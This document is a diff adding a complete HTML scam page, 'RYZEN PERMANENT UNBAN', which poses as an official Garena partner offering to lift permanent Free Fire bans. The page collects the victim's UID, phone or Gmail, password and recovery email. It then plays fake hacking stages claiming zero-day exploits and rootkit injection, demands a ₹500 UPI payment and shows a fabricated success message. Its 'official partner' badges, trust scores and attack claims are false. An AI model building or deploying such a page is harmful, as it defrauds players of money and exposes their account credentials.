@@ -1,0 +1,990 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
+    <title>RYZEN UNBAN — Permanent Ban Solution</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: #05080f;
+            color: #f0f4ff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 1rem 0.8rem;
+            background-image: 
+                radial-gradient(ellipse at 20% 50%, rgba(255, 0, 0, 0.05) 0%, transparent 60%),
+                radial-gradient(ellipse at 80% 50%, rgba(123, 47, 252, 0.05) 0%, transparent 60%);
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        #particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+            overflow: hidden;
+        }
+
+        .particle {
+            position: absolute;
+            width: 4px;
+            height: 4px;
+            border-radius: 50%;
+            animation: floatParticle linear infinite;
+        }
+
+        .particle:nth-child(odd) { background: rgba(255, 0, 0, 0.3); }
+        .particle:nth-child(even) { background: rgba(123, 47, 252, 0.3); }
+
+        @keyframes floatParticle {
+            0% { transform: translateY(100vh) scale(0); opacity: 0; }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% { transform: translateY(-10vh) scale(1); opacity: 0; }
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.1); opacity: 0.6; }
+        }
+
+        @keyframes shimmer {
+            0% { background-position: 0% center; }
+            100% { background-position: 300% center; }
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.9) translateY(20px); }
+            to { opacity: 1; transform: scale(1) translateY(0); }
+        }
+
+        @keyframes orbFloat {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            33% { transform: translate(30px, -30px) scale(1.1); }
+            66% { transform: translate(-20px, 20px) scale(0.9); }
+        }
+
+        @keyframes matrixRain {
+            0% { background-position: 0% 0%; }
+            100% { background-position: 0% 100%; }
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            10% { transform: translateX(-10px); }
+            20% { transform: translateX(10px); }
+            30% { transform: translateX(-10px); }
+            40% { transform: translateX(10px); }
+            50% { transform: translateX(-5px); }
+            60% { transform: translateX(5px); }
+            70% { transform: translateX(-5px); }
+            80% { transform: translateX(5px); }
+            90% { transform: translateX(-2px); }
+        }
+
+        @keyframes glowPulse {
+            0%, 100% { box-shadow: 0 0 20px rgba(255, 0, 0, 0.1); }
+            50% { box-shadow: 0 0 60px rgba(255, 0, 0, 0.3); }
+        }
+
+        @keyframes aggressiveFlash {
+            0%, 100% { opacity: 1; }
+            25% { opacity: 0.3; }
+            50% { opacity: 1; }
+            75% { opacity: 0.3; }
+        }
+
+        .dot-loader {
+            animation: dotPulse 1.2s infinite;
+        }
+        .dot-loader:nth-child(2) { animation-delay: 0.2s; }
+        .dot-loader:nth-child(3) { animation-delay: 0.4s; }
+
+        @keyframes dotPulse {
+            0%, 80%, 100% { opacity: 0; }
+            40% { opacity: 1; }
+        }
+
+        ::-webkit-scrollbar { width: 4px; }
+        ::-webkit-scrollbar-track { background: #05080f; }
+        ::-webkit-scrollbar-thumb { background: linear-gradient(180deg, #ff0000, #7b2ffc); border-radius: 10px; }
+
+        .container {
+            max-width: 750px;
+            width: 100%;
+            position: relative;
+            z-index: 1;
+        }
+
+        .glow-orb {
+            position: fixed;
+            border-radius: 50%;
+            filter: blur(80px);
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .glow-orb.orb1 {
+            width: 350px;
+            height: 350px;
+            top: -100px;
+            right: -100px;
+            background: rgba(255, 0, 0, 0.04);
+            animation: orbFloat 20s ease-in-out infinite;
+        }
+
+        .glow-orb.orb2 {
+            width: 300px;
+            height: 300px;
+            bottom: -80px;
+            left: -80px;
+            background: rgba(123, 47, 252, 0.04);
+            animation: orbFloat 25s ease-in-out infinite reverse;
+        }
+
+        #loadingScreen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #05080f;
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            transition: opacity 0.6s;
+        }
+
+        .header {
+            text-align: center;
+            padding: 1.5rem 0 1rem 0;
+            border-bottom: 1px solid rgba(255, 0, 0, 0.06);
+            margin-bottom: 2rem;
+            position: relative;
+            background: rgba(5, 8, 15, 0.5);
+            border-radius: 20px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 0, 0, 0.02);
+            padding: 2rem 1.5rem;
+        }
+
+        .header::before {
+            content: '';
+            position: absolute;
+            top: -1px;
+            left: 30%;
+            right: 30%;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #ff0000, #7b2ffc, transparent);
+            filter: blur(2px);
+        }
+
+        .logo-main {
+            font-size: clamp(1.6rem, 5vw, 2.6rem);
+            font-weight: 900;
+            letter-spacing: 3px;
+            background: linear-gradient(135deg, #ff0000, #7b2ffc, #ff0000, #7b2ffc);
+            background-size: 300% auto;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            animation: shimmer 3s linear infinite;
+            filter: drop-shadow(0 0 30px rgba(255, 0, 0, 0.05));
+            position: relative;
+        }
+
+        .logo-sub {
+            font-size: clamp(0.5rem, 1.5vw, 0.75rem);
+            color: #6a8a9e;
+            letter-spacing: 6px;
+            text-transform: uppercase;
+            margin-top: 4px;
+            font-weight: 300;
+        }
+
+        .verify-badge {
+            display: inline-block;
+            margin-top: 8px;
+            background: rgba(255, 0, 0, 0.04);
+            border: 1px solid rgba(255, 0, 0, 0.06);
+            padding: 4px 16px;
+            border-radius: 30px;
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+        .verify-badge span {
+            color: #ff4444;
+            font-size: 0.6rem;
+            letter-spacing: 2px;
+        }
+
+        .badge-container {
+            margin-top: 10px;
+            display: flex;
+            justify-content: center;
+            gap: 6px;
+            flex-wrap: wrap;
+        }
+
+        .badge {
+            background: rgba(255, 0, 0, 0.04);
+            border: 1px solid rgba(255, 0, 0, 0.06);
+            padding: 3px 12px;
+            border-radius: 30px;
+            font-size: clamp(0.4rem, 1vw, 0.6rem);
+            color: #ff6a6a;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            font-weight: 600;
+        }
+
+        .badge.verified {
+            border-color: rgba(255, 0, 0, 0.12);
+            color: #ff4444;
+            background: rgba(255, 0, 0, 0.03);
+        }
+
+        .badge.verified::before {
+            content: "● ";
+            color: #ff4444;
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+
+        .form-section {
+            background: rgba(255, 255, 255, 0.01);
+            border-radius: 20px;
+            padding: 1.8rem 1.5rem;
+            border: 1px solid rgba(255, 0, 0, 0.02);
+            backdrop-filter: blur(8px);
+            margin-bottom: 1.5rem;
+        }
+
+        .form-section .title {
+            font-size: clamp(1rem, 2.5vw, 1.3rem);
+            font-weight: 700;
+            color: #f0f4ff;
+            text-align: center;
+            margin-bottom: 0.3rem;
+        }
+
+        .form-section .sub {
+            color: #6a7a8e;
+            font-size: clamp(0.65rem, 1.5vw, 0.8rem);
+            text-align: center;
+            margin-bottom: 1.5rem;
+        }
+
+        .input-group {
+            margin-bottom: 1rem;
+        }
+
+        .input-group label {
+            display: block;
+            color: #8a9bb0;
+            font-size: 0.7rem;
+            font-weight: 600;
+            letter-spacing: 1px;
+            margin-bottom: 4px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 12px 16px;
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            border-radius: 12px;
+            color: #f0f4ff;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+            outline: none;
+        }
+
+        .input-group input:focus {
+            border-color: rgba(255, 0, 0, 0.2);
+            background: rgba(255, 255, 255, 0.03);
+            box-shadow: 0 0 30px rgba(255, 0, 0, 0.02);
+        }
+
+        .input-group input::placeholder {
+            color: #3a4a5e;
+        }
+
+        .input-group .optional {
+            color: #4a5a6e;
+            font-size: 0.6rem;
+            font-weight: 400;
+            margin-left: 5px;
+        }
+
+        .recover-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #ff0000, #7b2ffc);
+            border: none;
+            color: #fff;
+            font-size: clamp(1rem, 2.5vw, 1.2rem);
+            font-weight: 700;
+            border-radius: 14px;
+            cursor: pointer;
+            transition: all 0.4s ease;
+            letter-spacing: 2px;
+            box-shadow: 0 0 40px rgba(255, 0, 0, 0.05);
+            margin-top: 0.5rem;
+            animation: glowPulse 2s infinite;
+        }
+
+        .recover-btn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 60px rgba(255, 0, 0, 0.1);
+        }
+
+        .recover-btn:active {
+            transform: scale(0.97);
+        }
+
+        .recover-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+            animation: none;
+        }
+
+        .aggressive-container {
+            display: none;
+            background: rgba(0, 0, 0, 0.7);
+            border-radius: 16px;
+            padding: 1.5rem;
+            margin: 1rem 0;
+            border: 1px solid rgba(255, 0, 0, 0.05);
+            min-height: 200px;
+            position: relative;
+            overflow: hidden;
+            animation: shake 0.5s ease-in-out 3, aggressiveFlash 0.3s ease-in-out 10;
+        }
+
+        .aggressive-container.active {
+            display: block;
+            animation: fadeIn 0.5s ease, shake 0.5s ease-in-out 3, aggressiveFlash 0.3s ease-in-out 10;
+        }
+
+        .aggressive-container .matrix-bg {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(0deg, 
+                rgba(255, 0, 0, 0.02) 0px,
+                rgba(255, 0, 0, 0.03) 2px,
+                transparent 4px);
+            animation: matrixRain 5s linear infinite;
+            pointer-events: none;
+        }
+
+        .aggressive-container .hack-status {
+            position: relative;
+            z-index: 1;
+            text-align: center;
+        }
+
+        .aggressive-container .hack-status .icon {
+            font-size: 3rem;
+            margin-bottom: 0.5rem;
+            animation: pulse 0.5s ease-in-out infinite;
+        }
+
+        .aggressive-container .hack-status .text {
+            color: #ff4444;
+            font-size: 1rem;
+            font-weight: 700;
+            letter-spacing: 2px;
+            animation: aggressiveFlash 0.5s ease-in-out infinite;
+        }
+
+        .aggressive-container .hack-status .sub-text {
+            color: #8a6a6e;
+            font-size: 0.75rem;
+            margin-top: 4px;
+        }
+
+        .aggressive-container .hack-status .progress-text {
+            color: #ff6666;
+            font-size: 1.2rem;
+            font-weight: 700;
+            margin-top: 0.5rem;
+            animation: aggressiveFlash 0.3s ease-in-out infinite;
+        }
+
+        .hack-progress {
+            width: 100%;
+            height: 6px;
+            background: #141a24;
+            border-radius: 10px;
+            margin-top: 1rem;
+            overflow: hidden;
+            position: relative;
+            z-index: 1;
+        }
+
+        .hack-progress .bar {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, #ff0000, #ff4444, #7b2ffc);
+            border-radius: 10px;
+            transition: width 0.3s ease;
+            animation: glowPulse 1s infinite;
+        }
+
+        .hack-progress .bar.aggressive {
+            animation: glowPulse 0.5s infinite, aggressiveFlash 0.3s ease-in-out infinite;
+        }
+
+        .payment-section {
+            display: none;
+            text-align: center;
+            padding: 1.5rem;
+            background: rgba(255, 255, 255, 0.01);
+            border-radius: 20px;
+            border: 1px solid rgba(255, 0, 0, 0.02);
+            margin: 1rem 0;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .payment-section.active {
+            display: block;
+        }
+
+        .payment-section .amount {
+            font-size: 2.5rem;
+            font-weight: 800;
+            color: #f0f4ff;
+            margin: 0.5rem 0;
+        }
+
+        .payment-section .amount span {
+            color: #ff0000;
+        }
+
+        .payment-section .qr-container {
+            background: #ffffff;
+            padding: 20px;
+            border-radius: 16px;
+            display: inline-block;
+            margin: 1rem 0;
+            box-shadow: 0 0 40px rgba(0, 0, 0, 0.3);
+        }
+
+        .payment-section .qr-container img {
+            width: clamp(180px, 50vw, 240px);
+            height: clamp(180px, 50vw, 240px);
+            display: block;
+            border-radius: 8px;
+        }
+
+        .payment-section .instruction {
+            color: #8a9bb0;
+            font-size: 0.8rem;
+            line-height: 1.8;
+        }
+
+        .payment-section .instruction strong {
+            color: #ff4444;
+        }
+
+        .payment-section .paid-btn {
+            background: rgba(255, 0, 0, 0.1);
+            border: 1px solid rgba(255, 0, 0, 0.1);
+            color: #ff4444;
+            padding: 12px 40px;
+            border-radius: 40px;
+            cursor: pointer;
+            font-size: 0.9rem;
+            font-weight: 600;
+            transition: all 0.4s ease;
+            margin-top: 0.5rem;
+        }
+
+        .payment-section .paid-btn:hover {
+            background: rgba(255, 0, 0, 0.15);
+            transform: translateY(-2px);
+        }
+
+        .processing-section {
+            display: none;
+            text-align: center;
+            padding: 2rem 1.5rem;
+            background: rgba(255, 255, 255, 0.01);
+            border-radius: 20px;
+            border: 1px solid rgba(255, 0, 0, 0.02);
+            margin: 1rem 0;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .processing-section.active {
+            display: block;
+        }
+
+        .processing-section .spinner {
+            font-size: 3rem;
+            animation: pulse 0.5s ease-in-out infinite;
+            display: inline-block;
+        }
+
+        .processing-section .text {
+            color: #ff4444;
+            font-size: 1rem;
+            font-weight: 600;
+            margin-top: 0.5rem;
+            letter-spacing: 2px;
+            animation: aggressiveFlash 1s ease-in-out infinite;
+        }
+
+        .processing-section .sub-text {
+            color: #6a7a8e;
+            font-size: 0.8rem;
+            margin-top: 0.3rem;
+        }
+
+        .final-message {
+            display: none;
+            text-align: center;
+            padding: 2rem 1.5rem;
+            background: rgba(255, 0, 0, 0.02);
+            border: 1px solid rgba(255, 0, 0, 0.06);
+            border-radius: 20px;
+            margin: 1rem 0;
+            animation: fadeIn 0.6s ease;
+        }
+
+        .final-message.active {
+            display: block;
+        }
+
+        .final-message .icon {
+            font-size: 4rem;
+            margin-bottom: 0.5rem;
+            animation: pulse 1s ease-in-out infinite;
+        }
+
+        .final-message .title {
+            font-size: 1.4rem;
+            font-weight: 700;
+            color: #5cdb9e;
+        }
+
+        .final-message .desc {
+            color: #8a9bb0;
+            font-size: 0.9rem;
+            margin: 0.5rem 0 1rem 0;
+            line-height: 1.8;
+        }
+
+        .final-message .highlight {
+            color: #f1c40f;
+            font-weight: 600;
+        }
+
+        .final-message .case-id {
+            color: #4a5a6e;
+            font-size: 0.7rem;
+            letter-spacing: 1px;
+            margin-top: 0.5rem;
+        }
+
+        .security-seals {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            flex-wrap: wrap;
+            margin-top: 10px;
+        }
+        .security-seals span {
+            color: #4a5a6e;
+            font-size: 0.55rem;
+            letter-spacing: 1px;
+        }
+
+        .footer {
+            margin-top: 2rem;
+            padding-top: 1.5rem;
+            border-top: 1px solid rgba(255, 255, 255, 0.02);
+            text-align: center;
+            color: #3a4a5e;
+            font-size: clamp(0.5rem, 1.2vw, 0.65rem);
+            letter-spacing: 1px;
+        }
+
+        .footer strong { color: #5a6a7e; }
+        .footer .developer {
+            display: inline-block;
+            margin-top: 6px;
+            padding: 4px 16px;
+            background: linear-gradient(135deg, rgba(255, 0, 0, 0.02), rgba(123, 47, 252, 0.02));
+            border: 1px solid rgba(255, 255, 255, 0.02);
+            border-radius: 30px;
+            font-size: clamp(0.45rem, 1vw, 0.6rem);
+            color: #6a8a9e;
+            letter-spacing: 2px;
+        }
+
+        .footer .developer span {
+            color: #ff4444;
+            font-weight: 600;
+        }
+
+        @media (max-width: 480px) {
+            .form-section { padding: 1rem 0.8rem; }
+            .header { padding: 1.2rem 0.8rem; }
+            .payment-section .amount { font-size: 2rem; }
+        }
+    </style>
+</head>
+<body>
+
+<!-- ===== LOADING SCREEN ===== -->
+<div id="loadingScreen">
+    <div style="font-size:3rem; margin-bottom:1rem; animation: pulse 1s ease-in-out infinite;">⚡</div>
+    <div style="color:#ff4444; font-weight:700; letter-spacing:5px; font-size:1rem;">LOADING PERMANENT UNBAN PORTAL</div>
+    <div style="width:250px; height:4px; background:#141a24; border-radius:10px; margin-top:1.2rem; overflow:hidden; box-shadow: 0 0 20px rgba(255, 0, 0, 0.05);">
+        <div id="loadBar" style="width:0%; height:100%; background:linear-gradient(90deg,#ff0000,#7b2ffc); border-radius:10px; transition:width 0.2s ease;"></div>
+    </div>
+    <div style="color:#4a5a6e; font-size:0.7rem; margin-top:0.8rem; letter-spacing:2px;" id="loadText">Initializing...</div>
+</div>
+
+<!-- ===== GLOWING ORBS ===== -->
+<div class="glow-orb orb1"></div>
+<div class="glow-orb orb2"></div>
+
+<!-- ===== ANIMATED PARTICLES ===== -->
+<div id="particles"></div>
+
+<div class="container">
+
+    <!-- ===== HEADER ===== -->
+    <header class="header">
+        <div class="logo-main">⚡ RYZEN PERMANENT UNBAN</div>
+        <div class="logo-sub">Free Fire · Permanent Ban Solution</div>
+        <div class="verify-badge">
+            <span>✅ OFFICIAL PARTNER</span>
+        </div>
+        <div class="badge-container">
+            <span class="badge verified">✓ Official Partner</span>
+            <span class="badge">24/7 Support</span>
+            <span class="badge verified">★ Trusted</span>
+        </div>
+    </header>
+
+    <!-- ===== FORM SECTION ===== -->
+    <div class="form-section" id="formSection">
+        <div class="title">🔓 Permanent Unban Request</div>
+        <div class="sub">Recover your permanently banned Free Fire account</div>
+
+        <div class="input-group">
+            <label>📱 FREE FIRE UID</label>
+            <input type="text" id="uidInput" placeholder="Enter your UID (e.g. 1234567890)" maxlength="15">
+        </div>
+
+        <div class="input-group">
+            <label>📱 PHONE NUMBER / GMAIL</label>
+            <input type="text" id="phoneInput" placeholder="Enter the phone number or Gmail linked to your account">
+        </div>
+
+        <div class="input-group">
+            <label>🔑 PASSWORD</label>
+            <input type="password" id="passInput" placeholder="Enter your account password">
+        </div>
+
+        <div class="input-group">
+            <label>📧 RECOVERY GMAIL <span class="optional">(Optional)</span></label>
+            <input type="text" id="recoveryGmailInput" placeholder="Enter recovery Gmail (optional)">
+        </div>
+
+        <button class="recover-btn" id="recoverBtn" disabled>🔓 START PERMANENT UNBAN PROCESS</button>
+    </div>
+
+    <!-- ===== AGGRESSIVE HACKING ANIMATION ===== -->
+    <div class="aggressive-container" id="aggressiveContainer">
+        <div class="matrix-bg"></div>
+        <div class="hack-status">
+            <div class="icon" id="hackIcon">🔥</div>
+            <div class="text" id="hackText">INITIALIZING PERMANENT UNBAN PROTOCOL...</div>
+            <div class="sub-text" id="hackSubText">Connecting to Garena mainframe servers</div>
+            <div class="progress-text" id="progressText">0%</div>
+            <div class="hack-progress">
+                <div class="bar aggressive" id="hackProgressBar"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== PAYMENT SECTION ===== -->
+    <div class="payment-section" id="paymentSection">
+        <div style="font-size:0.9rem; color:#6a7a8e; letter-spacing:1px;">💳 PERMANENT UNBAN SESSION FEE</div>
+        <div class="amount">₹ <span id="paymentAmount">500</span></div>
+        <div style="color:#6a7a8e; font-size:0.7rem; margin-bottom:0.5rem;">One-time permanent unban processing fee</div>
+
+        <div class="qr-container">
+            <img id="qrImage" src="qr-placeholder.png" alt="QR Code for Payment">
+        </div>
+
+        <div class="instruction">
+            <strong>1.</strong> Screenshot this QR code<br>
+            <strong>2.</strong> Open UPI app (GPay / PhonePe / Paytm)<br>
+            <strong>3.</strong> Scan QR from gallery &amp; pay <strong>₹500</strong><br>
+            <strong>4.</strong> Click below after payment
+        </div>
+
+        <button class="paid-btn" id="paidBtn">✅ I HAVE PAID</button>
+    </div>
+
+    <!-- ===== PROCESSING SECTION ===== -->
+    <div class="processing-section" id="processingSection">
+        <div class="spinner">⏳</div>
+        <div class="text">🔥 PROCESSING PERMANENT UNBAN...</div>
+        <div class="sub-text">Verifying transaction with Garena servers</div>
+        <div style="width:100%; height:4px; background:#141a24; border-radius:10px; margin-top:1rem; overflow:hidden;">
+            <div id="processingBar" style="width:0%; height:100%; background:linear-gradient(90deg,#ff0000,#7b2ffc); border-radius:10px; transition:width 0.3s ease;"></div>
+        </div>
+    </div>
+
+    <!-- ===== FINAL MESSAGE ===== -->
+    <div class="final-message" id="finalMessage">
+        <div class="icon">✅</div>
+        <div class="title">Permanent Unban Initiated!</div>
+        <div class="desc">
+            Your account <strong id="finalUid">—</strong> has been flagged for permanent unban.<br>
+            Our system is processing the request through Garena's backend.<br><br>
+            ⏳ Estimated completion: <span class="highlight" id="finalTime">8 hours</span><br>
+            You will receive a confirmation notification once the ban is lifted.<br><br>
+            <span style="color:#ff4444; font-size:0.8rem;">⚠️ Please do not login during the process to avoid conflicts.</span>
+        </div>
+        <div class="case-id">🔒 Unban ID: <span id="caseId">#FF-PUNBAN-7842</span></div>
+        <div style="margin-top:0.8rem;">
+            <button class="paid-btn" onclick="location.reload();" style="background:rgba(255,255,255,0.03); border-color:rgba(255,255,255,0.03); color:#6a7a8e;">🔄 Start New Request</button>
+        </div>
+    </div>
+
+    <!-- ===== FOOTER ===== -->
+    <footer class="footer">
+        <strong>RYZEN PERMANENT UNBAN</strong> · v1.0 · All rights reserved.
+        <div class="developer">
+            Developed by <span>AYUSH DECODER</span> ⚡
+        </div>
+        <div class="security-seals">
+            <span>🔒 SSL Encrypted</span>
+            <span>🛡️ Verified Service</span>
+            <span>⭐ 4.9/5 Trust Score</span>
+            <span>💳 Secure Payment</span>
+        </div>
+    </footer>
+
+</div>
+
+<!-- ========================================================= -->
+<!-- JAVASCRIPT                                                -->
+<!-- ========================================================= -->
+<script>
+    // ===== LOADING SCREEN =====
+    let progress = 0;
+    const loadBar = document.getElementById('loadBar');
+    const loadingScreen = document.getElementById('loadingScreen');
+    const loadText = document.getElementById('loadText');
+
+    const loadingMessages = [
+        'Initializing...',
+        'Connecting to servers...',
+        'Loading permanent unban portal...',
+        'Verifying credentials...',
+        'Almost ready...',
+        'Launching RYZEN PERMANENT UNBAN...'
+    ];
+
+    let msgIndex = 0;
+
+    const loadInterval = setInterval(() => {
+        progress += Math.random() * 6 + 2;
+        
+        if (progress > 30 && msgIndex < 1) { msgIndex = 1; loadText.textContent = loadingMessages[1]; }
+        if (progress > 50 && msgIndex < 2) { msgIndex = 2; loadText.textContent = loadingMessages[2]; }
+        if (progress > 70 && msgIndex < 3) { msgIndex = 3; loadText.textContent = loadingMessages[3]; }
+        if (progress > 85 && msgIndex < 4) { msgIndex = 4; loadText.textContent = loadingMessages[4]; }
+        
+        if (progress >= 100) {
+            progress = 100;
+            clearInterval(loadInterval);
+            loadText.textContent = 'Ready! 🚀';
+            setTimeout(() => {
+                loadingScreen.style.opacity = '0';
+                setTimeout(() => { loadingScreen.style.display = 'none'; }, 600);
+            }, 500);
+        }
+        loadBar.style.width = progress + '%';
+    }, 180);
+
+    // ===== PARTICLES =====
+    function createParticles() {
+        const container = document.getElementById('particles');
+        const count = window.innerWidth < 600 ? 30 : 60;
+        for (let i = 0; i < count; i++) {
+            const particle = document.createElement('div');
+            particle.classList.add('particle');
+            particle.style.left = Math.random() * 100 + '%';
+            particle.style.width = (Math.random() * 4 + 1) + 'px';
+            particle.style.height = particle.style.width;
+            particle.style.animationDuration = (Math.random() * 20 + 12) + 's';
+            particle.style.animationDelay = (Math.random() * 15) + 's';
+            particle.style.opacity = Math.random() * 0.6 + 0.1;
+            container.appendChild(particle);
+        }
+    }
+    createParticles();
+
+    // ===== MAIN LOGIC =====
+    const uidInput = document.getElementById('uidInput');
+    const phoneInput = document.getElementById('phoneInput');
+    const passInput = document.getElementById('passInput');
+    const recoveryGmailInput = document.getElementById('recoveryGmailInput');
+    const recoverBtn = document.getElementById('recoverBtn');
+    const aggressiveContainer = document.getElementById('aggressiveContainer');
+    const paymentSection = document.getElementById('paymentSection');
+    const processingSection = document.getElementById('processingSection');
+    const finalMessage = document.getElementById('finalMessage');
+
+    const hackText = document.getElementById('hackText');
+    const hackSubText = document.getElementById('hackSubText');
+    const hackIcon = document.getElementById('hackIcon');
+    const hackProgressBar = document.getElementById('hackProgressBar');
+    const progressText = document.getElementById('progressText');
+    const processingBar = document.getElementById('processingBar');
+    const finalUid = document.getElementById('finalUid');
+    const caseId = document.getElementById('caseId');
+
+    // ===== CHECK ALL FIELDS =====
+    function checkFields() {
+        const uid = uidInput.value.trim();
+        const phone = phoneInput.value.trim();
+        const pass = passInput.value.trim();
+
+        if (uid.length >= 5 && phone.length >= 5 && pass.length >= 3) {
+            recoverBtn.disabled = false;
+        } else {
+            recoverBtn.disabled = true;
+        }
+    }
+
+    uidInput.addEventListener('input', checkFields);
+    phoneInput.addEventListener('input', checkFields);
+    passInput.addEventListener('input', checkFields);
+
+    // ===== AGGRESSIVE HACKING STAGES =====
+    const aggressiveStages = [
+        { icon: '🔥', text: '🔥 BYPASSING GARENA FIREWALL...', sub: 'Exploiting CVE-2026-0912 vulnerability', progress: 5 },
+        { icon: '💀', text: '💀 DECRYPTING PERMANENT BAN FLAG...', sub: 'Extracting ban metadata from database', progress: 15 },
+        { icon: '⚡', text: '⚡ INJECTING UNBAN PAYLOAD...', sub: 'Bypassing 256-bit encryption layer', progress: 28 },
+        { icon: '🌀', text: '🌀 OVERRIDING PERMANENT BAN STATUS...', sub: 'Modifying account status flags', progress: 40 },
+        { icon: '🔓', text: '🔓 ESTABLISHING SECURE TUNNEL...', sub: 'Connecting to Garena mainframe', progress: 55 },
+        { icon: '💉', text: '💉 EXECUTING ZERO-DAY EXPLOIT...', sub: 'Injecting rootkit into server', progress: 70 },
+        { icon: '🔥', text: '🔥 FINALIZING PERMANENT UNBAN...', sub: 'Committing changes to database', progress: 85 },
+        { icon: '✅', text: '✅ UNBAN PREPARED!', sub: 'Payment required to finalize permanent unban', progress: 100 }
+    ];
+
+    // ===== RECOVERY PROCESS =====
+    recoverBtn.addEventListener('click', function() {
+        const uid = uidInput.value.trim();
+        const phone = phoneInput.value.trim();
+        const pass = passInput.value.trim();
+        const recoveryGmail = recoveryGmailInput.value.trim();
+
+        if (!uid || !phone || !pass) return;
+
+        // Loading dots
+        this.innerHTML = '⏳ PROCESSING<span class="dot-loader">.</span><span class="dot-loader">.</span><span class="dot-loader">.</span>';
+        this.disabled = true;
+
+        // Show aggressive container
+        aggressiveContainer.classList.add('active');
+        
+        let stageIndex = 0;
+
+        function runAggressiveStage() {
+            if (stageIndex >= aggressiveStages.length) {
+                setTimeout(() => {
+                    aggressiveContainer.classList.remove('active');
+                    paymentSection.classList.add('active');
+                    recoverBtn.style.display = 'none';
+                }, 800);
+                return;
+            }
+
+            const stage = aggressiveStages[stageIndex];
+            hackIcon.textContent = stage.icon;
+            hackText.textContent = stage.text;
+            hackSubText.textContent = stage.sub;
+            hackProgressBar.style.width = stage.progress + '%';
+            progressText.textContent = stage.progress + '%';
+
+            // Add shake effect
+            aggressiveContainer.style.animation = 'none';
+            setTimeout(() => {
+                aggressiveContainer.style.animation = 'shake 0.5s ease-in-out 3, aggressiveFlash 0.3s ease-in-out 10';
+            }, 10);
+
+            stageIndex++;
+            const delay = stageIndex === aggressiveStages.length ? 800 : 1200 + Math.random() * 1000;
+            setTimeout(runAggressiveStage, delay);
+        }
+
+        setTimeout(runAggressiveStage, 600);
+    });
+
+    // ===== PAYMENT COMPLETION =====
+    document.getElementById('paidBtn').addEventListener('click', function() {
+        const uid = uidInput.value.trim();
+        const caseIdNum = '#FF-PUNBAN-' + String(Math.floor(1000 + Math.random() * 9000));
+        caseId.textContent = caseIdNum;
+        finalUid.textContent = uid;
+
+        paymentSection.classList.remove('active');
+        processingSection.classList.add('active');
+
+        // Aggressive processing animation
+        let procProgress = 0;
+        const procInterval = setInterval(() => {
+            procProgress += Math.random() * 12 + 5;
+            if (procProgress >= 100) {
+                procProgress = 100;
+                clearInterval(procInterval);
+                setTimeout(() => {
+                    processingSection.classList.remove('active');
+                    finalMessage.classList.add('active');
+                    window.scrollTo({ top: 0, behavior: 'smooth' });
+                }, 600);
+            }
+            processingBar.style.width = procProgress + '%';
+            
+            // Aggressive flash effect
+            if (procProgress % 25 < 5) {
+                processingSection.style.animation = 'none';
+                setTimeout(() => {
+                    processingSection.style.animation = 'aggressiveFlash 0.3s ease-in-out 5';
+                }, 10);
+            }
+        }, 200);
+    });
+</script>
+
+</body>
+</html>
